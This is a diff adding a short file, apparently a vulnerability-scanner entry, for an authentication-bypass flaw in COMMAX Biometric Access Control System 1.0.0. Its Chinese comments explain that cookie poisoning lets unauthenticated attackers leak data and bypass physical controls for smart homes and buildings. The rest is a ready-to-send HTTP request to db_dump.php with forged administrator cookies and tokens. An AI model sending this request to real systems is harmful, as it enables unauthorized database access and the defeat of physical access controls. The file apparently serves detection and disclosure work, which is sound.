@@ -1,0 +1,10 @@
+# COMMAX Biometric Access Control System 认证绕过漏洞
+# COMMAX Biometric Access Control System 1.0.0 存在认证绕过漏洞。未经验证的攻击者可以通过cookie中毒绕过认证，泄露敏感信息，绕过智能家居和建筑的物理控制。
+GET /db_dump.php?acid=80001482&bid=hd_tag_m8mv260q HTTP/1.1
+Host: www.swaf.com
+Cookie: CMX_SAVED_ID=zero; CMX_ADMIN_ID=science; CMX_ADMIN_NM=liquidworm; CMX_ADMIN_LV=9; CMX_COMPLEX_NM=ZSL; CMX_COMPLEX_IP=2.5.1.0
+RM-PRO-BusinessID: hd_tag_m8mv260q
+RM-PRO-Token: f64c05f9cf29b5573be9f1deadff675f
+RM-PRO-Time: 1742808520916
+User-Agent: curl/7.83.1
+
